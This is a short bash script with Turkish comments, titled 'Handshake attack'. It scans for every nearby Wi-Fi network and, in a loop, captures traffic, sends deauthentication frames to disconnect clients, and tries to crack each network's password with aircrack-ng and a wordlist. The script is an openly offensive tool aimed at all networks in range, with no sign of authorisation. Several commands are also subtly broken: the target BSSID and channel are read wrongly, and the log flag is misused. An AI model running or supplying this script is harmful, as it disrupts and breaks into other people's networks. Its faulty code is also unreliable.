#Handshake saldırısı
 #!/bin/bash

#Tüm wifi ağlarını tara
echo "Tüm wifi ağlarını tarama başlıyor..."
iwlist wlan0 scan | grep -ioE 'ssid:"(.*)"' | awk -F'"' '{print $2}' > networks.txt

#El sıkışmalarını kaydedilecek dosya adı
handshakes_file="handshakes-$(date '+%Y-%m-%d-%H-%M-%S').cap"

#Tüm ağları döngüye sok
while read network; do
    echo "Şimdi $network ağına saldırıyoruz..."
    
    #Ağa ait tüm istemcileri bul
    xterm -e "timeout 20s airodump-ng --bssid \$(iwconfig wlan0mon | awk '/Access Point:/ {print \$NF}') --output-format csv -w output wlan0mon 2>/dev/null" &
    sleep 10
    
    #Aircrack-ng ile ağa saldırı yap
    xterm -e "timeout 30s airodump-ng -w temp-capture --output-format pcap wlan0mon --bssid \$(iwconfig wlan0mon | awk '/Access Point:/ {print \$NF}') --channel \$(iwconfig wlan0mon | awk '/Frequency:/ {print \$NF}' | cut -c 2-3) 2>/dev/null" &
    xterm -e "aireplay-ng --deauth 5 -a \$(iwconfig wlan0mon | awk '/Access Point:/ {print \$NF}') wlan0mon" &
    sleep 10

    #Istemcilerden biri el sıkışma yapana kadar bekleyin
    xterm -e "timeout 60s aireplay-ng --deauth 5 -a \$(iwconfig wlan0mon | awk '/Access Point:/ {print \$NF}') wlan0mon 2>/dev/null" &
    sleep 10
    
    #El sıkışmalarını yakala
    xterm -e "aircrack-ng -w password_list.txt -b \$(iwconfig wlan0mon | awk '/Access Point:/ {print \$NF}') -e $network -l $handshakes_file temp-capture*.cap" &
    sleep 10
    
    #Kullanılan dosyaları temizle
    rm -f temp-capture*.cap
    rm -f output*.csv
done < networks.txt

#Tarama tamamlandı
echo "Tüm ağlar tarandı ve el sıkışmaları kaydedildi."




